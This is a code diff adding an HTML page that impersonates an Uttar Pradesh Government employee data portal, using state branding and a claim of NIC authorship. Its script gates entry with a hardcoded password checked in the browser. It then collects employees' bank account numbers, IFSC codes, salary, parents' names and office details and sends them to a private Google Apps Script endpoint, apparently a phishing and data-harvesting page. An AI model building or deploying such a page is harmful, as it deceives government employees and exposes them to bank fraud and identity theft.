@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>उत्तर प्रदेश सरकार कर्मचारी पोर्टल</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, 'Nirmala UI', sans-serif;
+        }
+        
+        body {
+            background: #f5f5f5 url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f8f8f8"/><path d="M0 0L100 100" stroke="%23e0e0e0" stroke-width="1"/><path d="M100 0L0 100" stroke="%23e0e0e0" stroke-width="1"/></svg>');
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Header Styles */
+        .top-bar {
+            background: linear-gradient(to right, #138808, #0c4c0c);
+            color: white;
+            padding: 8px 0;
+            font-size: 14px;
+            border-bottom: 2px solid #ff9933;
+        }
+        
+        .top-bar-content {
+            display: flex;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .header {
+            background: white;
+            color: #333;
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo {
+            height: 70px;
+            width: auto;
+        }
+        
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+        }
+        
+        .logo-main {
+            font-size: 24px;
+            font-weight: bold;
+            color: #138808;
+            letter-spacing: 0.5px;
+        }
+        
+        .logo-sub {
+            font-size: 14px;
+            color: #333;
+            margin-top: 2px;
+            letter-spacing: 1px;
+        }
+        
+        .header-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .header-links a {
+            color: #138808;
+            text-decoration: none;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+        }
+        
+        .header-links i {
+            margin-right: 5px;
+            font-size: 16px;
+        }
+        
+        /* User Info */
+        .user-info {
+            background: #e8f5e9;
+            padding: 10px 20px;
+            border-bottom: 1px solid #c8e6c9;
+            display: none;
+        }
+        
+        .user-info-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .welcome-text {
+            font-weight: 600;
+            color: #2e7d32;
+        }
+        
+        .user-role {
+            background: #0c4c0c;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+        
+        /* Navigation */
+        .navigation {
+            background: linear-gradient(to right, #0c4c0c, #138808);
+            padding: 12px 0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+            justify-content: center;
+        }
+        
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            padding: 5px 10px;
+            border-radius: 3px;
+            transition: background 0.3s;
+        }
+        
+        .nav-links a:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        
+        /* Card Styles */
+        .card {
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin: 30px auto;
+            max-width: 600px;
+            border-top: 4px solid #138808;
+            border-bottom: 4px solid #ff9933;
+        }
+        
+        .card-title {
+            color: #0c4c0c;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 24px;
+            border-bottom: 2px solid #f0f6ff;
+            padding-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #444;
+            font-size: 15px;
+        }
+        
+        input[type="text"],
+        input[type="password"],
+        input[type="email"],
+        input[type="number"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #f9f9f9;
+        }
+        
+        input:focus {
+            border-color: #138808;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(19, 136, 8, 0.2);
+            background: white;
+        }
+        
+        .btn {
+            background: linear-gradient(to right, #0c4c0c, #138808);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            transition: all 0.3s;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(to right, #083a08, #0c6e0c);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+        }
+        
+        /* Message Styles */
+        .message {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            text-align: center;
+            font-weight: 600;
+        }
+        
+        .error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ef9a9a;
+        }
+        
+        .success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #a5d6a7;
+        }
+        
+        /* Footer Styles */
+        footer {
+            background: linear-gradient(to right, #0c4c0c, #138808);
+            color: white;
+            padding: 30px 0 20px;
+            margin-top: auto;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+        
+        .footer-section h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            padding-bottom: 8px;
+            color: #ffcc00;
+        }
+        
+        .footer-section p, .footer-section a {
+            margin-bottom: 10px;
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
+            display: block;
+            font-size: 14px;
+        }
+        
+        .footer-section a:hover {
+            color: #ffcc00;
+            text-decoration: underline;
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding-top: 20px;
+            margin-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .logo-container {
+                margin-bottom: 15px;
+                justify-content: center;
+            }
+            
+            .header-links {
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+            
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 15px;
+            }
+            
+            .card {
+                padding: 20px;
+                margin: 20px 0;
+            }
+            
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .user-info-content {
+                flex-direction: column;
+                gap: 10px;
+                text-align: center;
+            }
+        }
+        
+        /* Employee Form Specific */
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 600px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* Portal Features */
+        .portal-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .feature {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            border-top: 4px solid #138808;
+            border-bottom: 2px solid #ff9933;
+        }
+        
+        .feature i {
+            font-size: 36px;
+            color: #138808;
+            margin-bottom: 15px;
+        }
+        
+        .feature h3 {
+            color: #0c4c0c;
+            margin-bottom: 10px;
+        }
+        
+        /* Language Selector */
+        .language-selector {
+            display: flex;
+            justify-content: flex-end;
+            padding: 10px 20px;
+            background: #f0f8f0;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .language-selector select {
+            padding: 8px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background: white;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        /* Government Seal */
+        .seal {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .seal img {
+            width: 100px;
+            height: 100px;
+            opacity: 0.8;
+        }
+        
+        /* Last Update */
+        .last-update {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+            margin-top: 10px;
+        }
+        
+        /* Dashboard Styles */
+        .dashboard-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .dashboard-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .dashboard-card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border-top: 4px solid #138808;
+        }
+        
+        .dashboard-card h3 {
+            color: #0c4c0c;
+            margin-bottom: 15px;
+        }
+        
+        .dashboard-card p {
+            font-size: 24px;
+            font-weight: bold;
+            color: #138808;
+        }
+        
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .action-btn {
+            background: linear-gradient(to right, #0c4c0c, #138808);
+            color: white;
+            padding: 15px;
+            border-radius: 6px;
+            text-align: center;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .action-btn:hover {
+            background: linear-gradient(to right, #083a08, #0c6e0c);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="top-bar-content">
+            <div class="contact">
+                <i class="fas fa-phone"></i> हेल्पलाइन: 1800-180-5145
+            </div>
+            <div class="email">
+                <i class="fas fa-envelope"></i> support@upgov.gov.in
+            </div>
+        </div>
+    </div>
+    
+    <!-- Language Selector -->
+    <div class="language-selector">
+        <select id="language-select">
+            <option value="hi">हिंदी</option>
+            <option value="en">English</option>
+            <option value="ur">Urdu</option>
+        </select>
+    </div>
+    
+    <!-- User Info Bar -->
+    <div class="user-info" id="user-info">
+        <div class="user-info-content">
+            <div class="welcome-text" id="welcome-text">स्वागत है, प्रियांशु शर्मा</div>
+            <div class="user-role">डाटा सेंटर अधिकारी ग्रुप बी</div>
+        </div>
+    </div>
+    
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="https://images.seeklogo.com/logo-png/21/2/uttar-pradesh-government-logo-png_seeklogo-217343.png" alt="Uttar Pradesh Government Logo" class="logo">
+                <div class="logo-text">
+                    <span class="logo-main">उत्तर प्रदेश सरकार</span>
+                    <span class="logo-sub">Uttar Pradesh Government</span>
+                    <span class="logo-sub">कर्मचारी डाटा पोर्टल</span>
+                </div>
+            </div>
+            <div class="header-links">
+                <a href="https://uplegisassembly.gov.in/"><i class="fas fa-home"></i> मुखपृष्ठ</a>
+                <a href="https://uplegisassembly.gov.in/"><i class="fas fa-info-circle"></i> जानकारी</a>
+                <a href="https://uplegisassembly.gov.in/"><i class="fas fa-question-circle"></i> सहायता</a>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Navigation -->
+    <nav class="navigation">
+        <div class="nav-content">
+            <ul class="nav-links">
+                <li><a href="">मुखपृष्ठ</a></li>
+                <li><a href="https://uplegisassembly.gov.in/">सेवाएं</a></li>
+                <li><a href="https://uplegisassembly.gov.in/">विभाग</a></li>
+                <li><a href="https://uplegisassembly.gov.in/">परिपत्र</a></li>
+                <li><a href="https://uplegisassembly.gov.in/">संपर्क</a></li>
+            </ul>
+        </div>
+    </nav>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Dashboard (Initially Hidden) -->
+        <div id="dashboard-section" style="display: none;">
+            <div class="dashboard-header">
+                <h1>कर्मचारी डैशबोर्ड</h1>
+                <p>उत्तर प्रदेश सरकार कर्मचारी पोर्टल में आपका स्वागत है</p>
+            </div>
+            
+            <div class="dashboard-cards">
+                <div class="dashboard-card">
+                    <h3>उपयोगकर्ता द्वारा अर्जित राशि</h3>
+                    <p>₹ 58,750</p>
+                    <small>इस माह का वेतन</small>
+                </div>
+                <div class="dashboard-card">
+                    <h3>छुट्टी शेष</h3>
+                    <p>12 दिन</p>
+                    <small>वार्षिक छुट्टी शेष</small>
+                </div>
+                <div class="dashboard-card">
+                    <h3>सेवा अवधि</h3>
+                    <p>1 वर्ष</p>
+                    <small>कुल सेवा अवधि</small>
+                </div>
+            </div>
+            
+            <div class="quick-actions">
+                <a href="#" class="action-btn"><i class="fas fa-file-invoice"></i> वेतन स्लिप</a>
+                <a href="profile.html" class="action-btn"><i class="fas fa-user-edit"></i>कर्मचारी प्रोफाइल </a>
+                <a href="#" class="action-btn"><i class="fas fa-calendar-alt"></i> छुट्टी आवेदन</a>
+                <a href="#" class="action-btn"><i class="fas fa-download"></i> दस्तावेज</a>
+            </div>
+        </div>
+        
+        <!-- Portal Features -->
+        <div class="portal-features">
+            <div class="feature">
+                <i class="fas fa-user-shield"></i>
+                <h3>सुरक्षित लॉगिन</h3>
+                <p>सरकारी कर्मचारी पोर्टल तक अत्यधिक सुरक्षित पहुंच</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-database"></i>
+                <h3>डेटा प्रबंधन</h3>
+                <p>कर्मचारी जानकारी का कुशल प्रबंधन</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-file-invoice"></i>
+                <h3>डेटा अद्यतनकर्ता</h3>
+                <p>सरकारी कर्मचारियों का मासिक आंकड़ा</p>
+            </div>
+        </div>
+        
+        <!-- Government Seal -->
+        <div class="seal">
+            <img src="Seal_of_Uttar_Pradesh.svg.png" alt="Uttar Pradesh Government Seal">
+        </div>
+        
+        <!-- Login Form -->
+        <div id="login-section" class="card">
+            <h2 class="card-title">सुरक्षित कर्मचारी लॉगिन</h2>
+            <div id="login-message"></div>
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="employee-id"><i class="fas fa-id-card"></i> कर्मचारी आईडी</label>
+                    <input type="text" id="employee-id" placeholder="अपना कर्मचारी आईडी दर्ज करें" required>
+                </div>
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> पासवर्ड</label>
+                    <input type="password" id="password" placeholder="अपना पासवर्ड दर्ज करें" required>
+                </div>
+                <button type="submit" class="btn"><i class="fas fa-sign-in-alt"></i> पोर्टल में लॉगिन करें</button>
+            </form>
+            <div style="text-align: center; margin-top: 20px;">
+                <a href="#" style="color: #138808; text-decoration: none;"><i class="fas fa-key"></i> पासवर्ड भूल गए?</a>
+            </div>
+            <div class="last-update">अंतिम अद्यतन: 15 अक्टूबर 2023</div>
+        </div>
+
+        <!-- Employee Details Form (Initially Hidden) -->
+        <div id="employee-form-section" class="card" style="display: none;">
+            <h2 class="card-title">इस महीने का कर्मचारी राजस्व</h2>
+            <div id="form-message"></div>
+            <form id="employee-form">
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="employee-name">कर्मचारी का नाम</label>
+                        <input type="text" id="employee-name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="salary">इस महीने का वेतन</label>
+                        <input type="number" id="salary" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="batch-number">बैच नंबर</label>
+                        <input type="text" id="batch-number" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">ईमेल आईडी</label>
+                        <input type="email" id="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="account-number">बैंक खाता संख्या</label>
+                        <input type="text" id="account-number" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="ifsc-code">आईएफएससी कोड</label>
+                        <input type="text" id="ifsc-code" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="father-name">पिता का नाम</label>
+                        <input type="text" id="father-name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="mother-name">माता का नाम</label>
+                        <input type="text" id="mother-name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="designation">नौकरी का पद</label>
+                        <input type="text" id="designation" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="office-name">कार्यालय का नाम</label>
+                        <input type="text" id="office-name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="office-code">कार्यालय कोड</label>
+                        <input type="text" id="office-code" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="room-number">कमरा नंबर</label>
+                        <input type="text" id="room-number" required>
+                    </div>
+                </div>
+                <button type="submit" class="btn"><i class="fas fa-paper-plane"></i> विवरण जमा करें</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>त्वरित लिंक</h3>
+                <a href="#">मुखपृष्ठ</a>
+                <a href="#">सेवाएं</a>
+                <a href="#">विभाग</a>
+                <a href="#">परिपत्र</a>
+                <a href="#">संपर्क</a>
+            </div>
+            <div class="footer-section">
+                <h3>महत्वपूर्ण पोर्टल</h3>
+                <a href="#">उप्र मुख्यमंत्री कार्यालय</a>
+                <a href="#">उप्र जिला पोर्टल</a>
+                <a href="#">उप्र पुलिस</a>
+                <a href="#">उप्र पर्यटन</a>
+            </div>
+            <div class="footer-section">
+                <h3>हमसे संपर्क करें</h3>
+                <p><i class="fas fa-phone"></i> हेल्पलाइन: 1800-180-5145</p>
+                <p><i class="fas fa-envelope"></i> ईमेल: support@upgov.gov.in</p>
+                <p><i class="fas fa-map-marker-alt"></i> पता: विधान सभा, लखनऊ, उत्तर प्रदेश</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2023 उत्तर प्रदेश सरकार कर्मचारी डाटा पोर्टल। सर्वाधिकार सुरक्षित।</p>
+            <p>राष्ट्रीय सूचना विज्ञान केंद्र, उत्तर प्रदेश द्वारा डिजाइन और विकसित</p>
+        </div>
+    </footer>
+
+    <script>
+        // DOM Elements
+        const loginSection = document.getElementById('login-section');
+        const employeeFormSection = document.getElementById('employee-form-section');
+        const dashboardSection = document.getElementById('dashboard-section');
+        const userInfoSection = document.getElementById('user-info');
+        const loginForm = document.getElementById('login-form');
+        const employeeForm = document.getElementById('employee-form');
+        const loginMessage = document.getElementById('login-message');
+        const formMessage = document.getElementById('form-message');
+        const languageSelect = document.getElementById('language-select');
+        
+        // Fixed Login Credentials
+        const CORRECT_ID = 'GOV144946';
+        const CORRECT_PASSWORD = '@Gov144';
+        
+        // Google Apps Script URL
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyBV9XNnOh5JJpPc4Bt36JnIgN6-omwuKYrQzFcrNzVqh7n-x4NQMIEHx7ML1lyABXy7A/exec';
+        
+        // Set Hindi as default language
+        document.documentElement.lang = 'hi';
+        
+        // Handle Login Form Submission
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const employeeId = document.getElementById('employee-id').value;
+            const password = document.getElementById('password').value;
+            
+            if (employeeId === CORRECT_ID && password === CORRECT_PASSWORD) {
+                // Successful login
+                loginSection.style.display = 'none';
+                employeeFormSection.style.display = 'block';
+                dashboardSection.style.display = 'block';
+                userInfoSection.style.display = 'block';
+                showMessage(loginMessage, 'लॉगिन सफल। कृपया अपना विवरण भरें।', 'success');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else {
+                // Failed login
+                showMessage(loginMessage, 'अमान्य कर्मचारी आईडी या पासवर्ड। कृपया पुनः प्रयास करें।', 'error');
+            }
+        });
+        
+        // Handle Employee Form Submission
+        employeeForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            const submitBtn = employeeForm.querySelector('button[type="submit"]');
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> जमा किया जा रहा है...';
+            submitBtn.disabled = true;
+            
+            // Collect form data
+            const formData = {
+                employeeName: document.getElementById('employee-name').value,
+                salary: document.getElementById('salary').value,
+                batchNumber: document.getElementById('batch-number').value,
+                email: document.getElementById('email').value,
+                accountNumber: document.getElementById('account-number').value,
+                ifscCode: document.getElementById('ifsc-code').value,
+                fatherName: document.getElementById('father-name').value,
+                motherName: document.getElementById('mother-name').value,
+                designation: document.getElementById('designation').value,
+                officeName: document.getElementById('office-name').value,
+                officeCode: document.getElementById('office-code').value,
+                roomNumber: document.getElementById('room-number').value,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send data to Google Sheets
+            fetch(scriptURL, { 
+                method: 'POST', 
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(() => {
+                showMessage(formMessage, 'डेटा सफलतापूर्वक जमा किया गया।', 'success');
+                employeeForm.reset();
+                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> विवरण जमा करें';
+                submitBtn.disabled = false;
+            })
+            .catch(error => {
+                showMessage(formMessage, 'डेटा जमा करने में त्रुटि। कृपया पुनः प्रयास करें।', 'error');
+                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> विवरण जमा करें';
+                submitBtn.disabled = false;
+                console.error('Error:', error);
+            });
+        });
+        
+        // Language selector functionality
+        languageSelect.addEventListener('change', function() {
+            if (this.value === 'en') {
+                switchToEnglish();
+            } else if (this.value === 'hi') {
+                switchToHindi();
+            }
+        });
+        
+        // Function to show messages
+        function showMessage(element, message, type) {
+            element.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i> ${message}`;
+            element.className = 'message ' + type;
+            element.style.display = 'block';
+            
+            // Auto-hide success messages after 5 seconds
+            if (type === 'success') {
+                setTimeout(() => {
+                    element.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        // Language switching functions
+        function switchToHindi() {
+            document.documentElement.lang = 'hi';
+            document.title = 'उत्तर प्रदेश आंकड़ा अधिकारी पोर्टल';
+            
+            // Update login form
+            document.querySelector('#login-section .card-title').textContent = 'सुरक्षित कर्मचारी लॉगिन';
+            document.querySelector('label[for="employee-id"]').innerHTML = '<i class="fas fa-id-card"></i> कर्मचारी आईडी';
+            document.getElementById('employee-id').placeholder = 'अपना कर्मचारी आईडी दर्ज करें';
+            document.querySelector('label[for="password"]').innerHTML = '<i class="fas fa-lock"></i> पासवर्ड';
+            document.getElementById('password').placeholder = 'अपना पासवर्ड दर्ज करें';
+            document.querySelector('#login-form button').innerHTML = '<i class="fas fa-sign-in-alt"></i> पोर्टल में लॉगिन करें';
+            document.querySelector('#login-section a').innerHTML = '<i class="fas fa-key"></i> पासवर्ड भूल गए?';
+            
+            // Update user info if visible
+            if (userInfoSection.style.display === 'block') {
+                document.getElementById('welcome-text').textContent = 'स्वागत है, प्रियांशु शर्मा';
+                document.querySelector('.user-role').textContent = 'डाटा सेंटर अधिकारी | ग्रुप (बी)';
+            }
+        }
+        
+        function switchToEnglish() {
+            document.documentElement.lang = 'en';
+            document.title = 'Uttar Pradesh Government Employee Portal';
+            
+            // Update login form
+            document.querySelector('#login-section .card-title').textContent = 'Secure Employee Login';
+            document.querySelector('label[for="employee-id"]').innerHTML = '<i class="fas fa-id-card"></i> Employee ID';
+            document.getElementById('employee-id').placeholder = 'Enter your employee ID';
+            document.querySelector('label[for="password"]').innerHTML = '<i class="fas fa-lock"></i> Password';
+            document.getElementById('password').placeholder = 'Enter your password';
+            document.querySelector('#login-form button').innerHTML = '<i class="fas fa-sign-in-alt"></i> Login to Portal';
+            document.querySelector('#login-section a').innerHTML = '<i class="fas fa-key"></i> Forgot Password?';
+            
+            // Update user info if visible
+            if (userInfoSection.style.display === 'block') {
+                document.getElementById('welcome-text').textContent = 'Welcome, Priyanshu Sharma';
+                document.querySelector('.user-role').textContent = 'Data Centre Adhikari Group B';
+            }
+        }
+    </script>
+</body>
+</html>
